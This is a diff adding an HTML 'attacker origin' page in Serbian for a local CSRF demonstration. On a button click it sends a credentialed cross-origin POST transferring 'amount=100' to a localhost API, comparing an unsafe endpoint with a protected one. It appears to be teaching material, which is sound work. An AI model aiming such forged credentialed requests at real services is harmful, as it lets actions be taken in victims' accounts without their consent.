@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="sr">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Attacker origin</title>
+<style>:root{font-family:Inter,system-ui,sans-serif;color:#3f463b;background:#f7f1e6}*{box-sizing:border-box}body{max-width:620px;margin:48px auto;padding:30px;background:#fffdf9;border:1px solid #ddd6c8;border-radius:18px;box-shadow:0 10px 28px rgba(78,90,70,.1)}h1{color:#c26d53;font-size:1.8rem}p{line-height:1.65}pre{white-space:pre-wrap;word-break:break-word;background:#313a32;color:#f7f1e6;padding:16px;border-radius:10px}button{padding:11px 16px;background:#c26d53;color:#fff;border:0;border-radius:8px;font-weight:650;cursor:pointer}@media(max-width:680px){body{margin:16px;padding:22px}}</style></head>
+<body>
+  <h1>Napadačka stranica — localhost:5174</h1>
+  <p>Ova stranica ne čita cookie, JWT niti localStorage žrtve i ne postavlja Authorization ili CSRF zaglavlje.</p>
+  <button id="attack">Pošalji zahtev bez znanja aplikacije</button>
+  <pre id="result">Klikni dugme da eksplicitno pokreneš demonstraciju.</pre>
+  <script>
+    const target = new URLSearchParams(location.search).get('target') === 'protected' ? 'protected' : 'unsafe';
+    document.getElementById('attack').onclick = async () => {
+      let status = 0; let message = '';
+      try {
+        const response = await fetch(`http://localhost:8080/api/csrf-demo/${target}/transfer`, {
+          method: 'POST', credentials: 'include',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'amount=100'
+        });
+        status = response.status;
+        const data = await response.json(); message = data.message || JSON.stringify(data);
+      } catch (error) { message = error.message; }
+      document.getElementById('result').textContent = `HTTP ${status}\n${message}`;
+      window.opener?.postMessage({ type: 'csrf-demo-result', target, status, message }, 'http://localhost:5173');
+    };
+  </script>
+</body></html>
